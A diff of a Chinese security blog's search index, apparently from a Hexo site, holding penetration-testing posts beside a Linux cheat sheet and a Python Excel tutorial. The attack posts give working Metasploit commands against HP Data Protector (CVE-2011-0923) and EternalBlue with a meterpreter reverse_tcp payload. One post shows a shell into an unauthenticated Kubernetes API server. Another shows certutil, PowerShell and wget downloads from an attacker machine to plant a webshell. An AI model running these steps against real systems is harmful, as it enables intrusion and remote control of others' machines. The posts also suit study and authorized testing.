@@ -1,77 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HP Data Protector漏洞利用记录</title>
-    <url>/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
-<h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img data-src="HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
-<a id="more"></a>
-<h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img data-src="HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-41-18.png"></p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
-<li>升级Data Protector到A.06.20 或更高版本</li>
-<li>对服务启用加密</li>
-<li>参考：<br><a href="http://www.zerodayinitiative.com/advisories/ZDI-11-055/">http://www.zerodayinitiative.com/advisories/ZDI-11-055/</a><br><a href="http://seclists.org/bugtraq/2011/Feb/73">http://seclists.org/bugtraq/2011/Feb/73</a><br><a href="http://www.nessus.org/u?6ca03389">http://www.nessus.org/u?6ca03389</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kubernetes Api Server 未授权访问漏洞GetShell</title>
-    <url>/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="下载kubectl客户端"><a href="#下载kubectl客户端" class="headerlink" title="下载kubectl客户端"></a>下载kubectl客户端</h3><p>参考<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-windows">官方文档</a><br>因为官方从Google下载，国内下载可能比较困难，这里提供一个Windows版本的kubectl客户端（<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/kubectl.exe/kubectl.exe">下载地址</a>)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5:eb9039d1285045b48313766aebf3558e *kubectl.exe</span><br></pre></td></tr></table></figure>
-<h3 id="获取容器shell"><a href="#获取容器shell" class="headerlink" title="获取容器shell"></a>获取容器shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubtctl.exe -s ip:port get pods</span><br><span class="line">kubectl.exe -s ip:port --namespace&#x3D;default exec -it &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
-<p><img data-src="Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/2020-08-20-16-56-00.png"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://moyu.life/post/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">Kubernetes Api Server 未授权访问漏洞</a></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux命令备忘</title>
-    <url>/2020/01/03/Linux%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
-    <content><![CDATA[<h3 id="Linux命令备忘"><a href="#Linux命令备忘" class="headerlink" title="Linux命令备忘"></a>Linux命令备忘</h3><ol start="0">
-<li>xargs占位符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
-<li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
-<li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
-<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure>
-<a id="more"></a></li>
-<li>批量杀进程<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
-<li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
-<li>wget设置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
-<li>Debian设置SSH自启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d  ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></li>
-<li>Kali设置阿里云源<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改/etc/apt/sources.list文件为以下内容：</span><br><span class="line">deb https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li>
-<li>查找重复行并统计出现次数，例：统计各IP出现次数 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ip.txt |grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][ 0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>  |sort |uniq -c &gt; ipncount.txt</span><br></pre></td></tr></table></figure>
-
-
-
-
-</li>
-</ol>
-<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Metasploit利用Eternalblue-Doublepulsar</title>
     <url>/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
@@ -91,7 +20,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 <p>使用漏洞利用模块，值得注意的一点是需要设置<code>PROCESSINJECT</code>这一变量值，在本次实验中，使用默认值并没有成功，修改<code>PROCESSINJECT</code>为<code>explorer.exe</code>成功拿到<code>meterpreter shell</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-14.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-34.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-40.png"><br><img data-src="Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-47.png"></p>
+<p><img data-src="2020-08-20-17-36-14.png"><br><img data-src="2020-08-20-17-36-34.png"><br><img data-src="2020-08-20-17-36-40.png"><br><img data-src="2020-08-20-17-36-47.png"></p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://laucyun.com/a6cb3c752b0fc10f0a9eeef01f7a5f76.html">通过Metasploit实现对MS17-010漏洞的利用</a></p>
 ]]></content>
       <categories>
@@ -99,6 +28,133 @@
       </categories>
       <tags>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kubernetes Api Server 未授权访问漏洞GetShell</title>
+    <url>/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="下载kubectl客户端"><a href="#下载kubectl客户端" class="headerlink" title="下载kubectl客户端"></a>下载kubectl客户端</h3><p>参考<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-windows">官方文档</a><br>因为官方从Google下载，国内下载可能比较困难，这里提供一个Windows版本的kubectl客户端（<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/kubectl.exe/kubectl.exe">下载地址</a>)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5:eb9039d1285045b48313766aebf3558e *kubectl.exe</span><br></pre></td></tr></table></figure>
+<h3 id="获取容器shell"><a href="#获取容器shell" class="headerlink" title="获取容器shell"></a>获取容器shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubtctl.exe -s ip:port get pods</span><br><span class="line">kubectl.exe -s ip:port --namespace&#x3D;default exec -it &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-20-16-56-00.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://moyu.life/post/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">Kubernetes Api Server 未授权访问漏洞</a></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HP Data Protector漏洞利用记录</title>
+    <url>/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
+<h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-20-17-40-26.png"></p>
+<a id="more"></a>
+<h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-20-17-41-18.png"></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>升级Data Protector到A.06.20 或更高版本</li>
+<li>对服务启用加密</li>
+<li>参考：<br><a href="http://www.zerodayinitiative.com/advisories/ZDI-11-055/">http://www.zerodayinitiative.com/advisories/ZDI-11-055/</a><br><a href="http://seclists.org/bugtraq/2011/Feb/73">http://seclists.org/bugtraq/2011/Feb/73</a><br><a href="http://www.nessus.org/u?6ca03389">http://www.nessus.org/u?6ca03389</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SHELL写文件的几种方式</title>
+    <url>/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img data-src="2020-08-20-17-00-21.png"></p>
+<p>但是靶机无法上公网和反连攻击机，然后通过<code>echo</code>等方式写<code>shell</code>的方法。受限于本人有限的知识面以及实用性等考量，这里列出的方法并不全面，仅供参考。</p>
+<a id="more"></a>
+<h3 id="Windows-下写文件"><a href="#Windows-下写文件" class="headerlink" title="Windows 下写文件"></a>Windows 下写文件</h3><h4 id="echo写文件"><a href="#echo写文件" class="headerlink" title="echo写文件"></a>echo写文件</h4><p>这是最原始的方法，比较折腾人。如果你以为只要<code>echo 1 &gt; 1.txt</code>这样写入，就图样了。Windows下的<code>cmd echo</code>写入需要特殊字符转义，如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; --- ^&lt;</span><br><span class="line">&gt; --- ^&gt;</span><br><span class="line">/ --- ^/</span><br><span class="line">+ --- ^+</span><br></pre></td></tr></table></figure>
+<p>另外，由于web服务器自动转码<code>URL编码</code>，把原本不是URL编码的字符转码了，导致写入的文件错误，所以还需对下面的字符转码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% --&gt; %25    # --&gt; %23    @ --&gt; %40</span><br><span class="line">+ --&gt; %2b    | --&gt; %7c    &amp; --&gt; ^%26</span><br></pre></td></tr></table></figure>
+<p><code>冰蝎</code>马使用这种方法转码的效果如下：<br><img data-src="2020-08-20-17-02-27.png"><br>然后通过<code>echo &lt;转码后的payload&gt; &gt; path/xxx.ext</code>写入文件，示例如下：<br><img data-src="2020-08-20-17-02-56.png"><br>局限性：</p>
+<ul>
+<li><p>Echo 字符数量有限，依赖于具体的浏览器也依赖于 web 服务器，当然还有万恶的 IDS。</p>
+</li>
+<li><p>IE 在地址栏的字符数上限是 2048 个字符</p>
+</li>
+<li><p>Chrome 没有明显的上限, 超过 1M 的内容也可以轻松接受</p>
+</li>
+<li><p>Firefox 没有明显的上限, 超过 5M 的内容也可以轻松接受</p>
+</li>
+<li><p>LinuxWin tomcat jboss 接受的 URL 最大长度是 7800</p>
+</li>
+<li><p>Windows Tomcat URL7825</p>
+</li>
+<li><p>Windows PHP Apache URL 最大长度为 8193<br>IIS6 ASP URL 最大长度为 15973</p>
+</li>
+</ul>
+<h4 id="certutil-base64解码写入"><a href="#certutil-base64解码写入" class="headerlink" title="certutil base64解码写入"></a>certutil base64解码写入</h4><p>上面提到<code>echo</code>写入万恶的转义问题，那么，通过base64编码是不是可以解决这烦人的转义问题呢？是的！<br>比如，我们要把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（base64编码为：<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>）写入文件，可用如下方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== &gt; 1.txt</span><br><span class="line">certutil.exe -decode 1.txt 2.jsp</span><br></pre></td></tr></table></figure>
+<p>这时候<code>2.jsp</code>就是要写入的内容：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.jsp</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>顺带一提，<code>certutil</code>下载文件的方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &lt;url&gt;</span><br><span class="line">示例：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt</span><br><span class="line">或者：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt 2.txt</span><br></pre></td></tr></table></figure>
+<p>不幸的是，<strong>即使下载的不是有毒文件，杀软还是很可能会杀掉：</strong><br><img data-src="2020-08-20-17-05-57.png"><br><img data-src="2020-08-20-17-06-02.png"></p>
+<h4 id="powershell-base64写入"><a href="#powershell-base64写入" class="headerlink" title="powershell base64写入"></a>powershell base64写入</h4><p><code>powershell</code>写入的方法就简单得多，如下：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;</span></span><br><span class="line">[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$data</span>))</span><br></pre></td></tr></table></figure>
+<p>效果如下，在后面加上重定向符即可写入文件:<br><img data-src="2020-08-20-17-06-50.png"></p>
+<h4 id="powershell下载文件"><a href="#powershell下载文件" class="headerlink" title="powershell下载文件"></a>powershell下载文件</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">打印远程文件到控制台：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">或者：</span><br><span class="line">powershell <span class="literal">-c</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">直接下载文件：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>, <span class="string">&#x27;1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img data-src="2020-08-20-17-07-43.png"></p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>因为Linux一般都自带base64命令，这里就不讨论转义的问题了。</p>
+<h4 id="bash-base64写入"><a href="#bash-base64写入" class="headerlink" title="bash base64写入"></a>bash base64写入</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== |base64 -d &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="wget-下载"><a href="#wget-下载" class="headerlink" title="wget 下载"></a>wget 下载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.245.130:8080/1.txt -O 1.jsp</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://rinige.com/index.php/archives/794/">CMD SHELL ECHO 写文件</a><br><a href="https://codeday.me/bug/20190305/738026.html">用powershell解码base64</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python读取Excel合并单元格</title>
+    <url>/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Python 读取Excel合并单元格时，被合并的单元格读出来可能是空值，比如下图中单元格”A3”读取出来的值为空，而我们希望它是”A”。<br><img data-src="2020-08-20-19-12-27.png"></p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
+<li>Python 3</li>
+<li>xlrd==1.2.0</li>
+</ul>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
+<p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img data-src="2020-08-20-19-14-52.png"></p>
+<p>示例代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">mc = sheet.merged_cells</span><br><span class="line">print(mc)</span><br></pre></td></tr></table></figure>
+<p>结果输出：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_merged_cells_value</span>(<span class="params">sheet, row_index, col_index</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断单元格是否为合并单元格，是则返回合并单元格的值，否则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    merged_cells = sheet.merged_cells</span><br><span class="line">    <span class="keyword">for</span> rlo, rhi, clo, chi <span class="keyword">in</span> merged_cells:</span><br><span class="line">        <span class="comment"># 判断行下标是否在合并单元格范围内</span></span><br><span class="line">        <span class="keyword">if</span> row_index <span class="keyword">in</span> range(rlo, rhi):</span><br><span class="line">            <span class="comment"># 判断列下标是否在合并单元格范围内</span></span><br><span class="line">            <span class="keyword">if</span> col_index <span class="keyword">in</span> range(clo, chi):</span><br><span class="line">                <span class="comment"># 返回单元格值</span></span><br><span class="line">                <span class="keyword">return</span> sheet.cell_value(rlo, clo)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 打开Excel</span></span><br><span class="line">    wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 指定工作表</span></span><br><span class="line">    sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取总行数</span></span><br><span class="line">    rows_num = sheet.nrows</span><br><span class="line">    <span class="comment"># 获取总列数</span></span><br><span class="line">    cols_num = sheet.ncols</span><br><span class="line">    <span class="comment"># 遍历行</span></span><br><span class="line">    <span class="keyword">for</span> ri <span class="keyword">in</span> range(rows_num):</span><br><span class="line">        row = sheet.row_values(ri)</span><br><span class="line">        <span class="comment"># 遍历列</span></span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> range(cols_num):</span><br><span class="line">            <span class="comment"># 获取合并单元格值，不是合并单元格的返回None</span></span><br><span class="line">            merged_cell_value = get_merged_cells_value(sheet, ri, ci)</span><br><span class="line">            <span class="comment"># 判断单元格是否在合并单元格清单中，是的话则返回正确的单元格值</span></span><br><span class="line">            <span class="keyword">if</span> merged_cell_value:</span><br><span class="line">                <span class="comment"># 修改行中合并单元格值为正确值</span></span><br><span class="line">                row[ci] = merged_cell_value</span><br><span class="line">        <span class="comment"># 打印列结果</span></span><br><span class="line">        print(row)</span><br><span class="line">        <span class="comment"># 后面的根据实际需要进行加工</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;列1&#x27;</span>, <span class="string">&#x27;列2&#x27;</span>, <span class="string">&#x27;列3&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">1.0</span>, <span class="number">4.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">2.0</span>, <span class="number">5.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">3.0</span>, <span class="number">6.0</span>]</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xlrd.readthedocs.io/en/latest/api.html?highlight=merged_cells#xlrd.sheet.Sheet.merged_cells">xlrd官方文档</a><br><a href="https://www.jianshu.com/p/24a693fff4a3">python3读取Excel(包含合并单元格)</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -141,88 +197,32 @@
       </tags>
   </entry>
   <entry>
-    <title>Python读取Excel合并单元格</title>
-    <url>/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Python 读取Excel合并单元格时，被合并的单元格读出来可能是空值，比如下图中单元格”A3”读取出来的值为空，而我们希望它是”A”。<br><img data-src="Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-12-27.png"></p>
